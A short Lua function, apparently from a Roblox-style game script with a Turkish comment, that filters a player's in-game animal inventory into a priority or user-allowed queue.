-- Bellekten envanteri oku (PRIORITY/NORMAL filtresiyle)
local function buildQueueFromMemory(filterType)
    local queue = {}
    local animalList = getMyAnimalListSafe()
    if not animalList then return queue end

    for slotKey, data in pairs(animalList) do
        if type(data) == "table" and data.Index then
            local info = AnimalsData and AnimalsData[data.Index]
            local dName = (info and info.DisplayName) or data.Index
            local isPriority = PRIORITY_BRAINROTS[data.Index] or PRIORITY_BRAINROTS[dName] or false
            local isUserWanted = UserAllowedAnimals[data.Index] or UserAllowedAnimals[dName] or false

            local include = false
            if filterType == "PRIORITY" and isPriority then
                include = true
            elseif filterType == "NORMAL" and (not isPriority) and isUserWanted then
                include = true
            end

            if include then
                table.insert(queue, {
                    slotKey = slotKey,
                    data = data,
                    displayName = dName,
                    isPriority = isPriority
                })
            end
        end
    end
    return queue
end

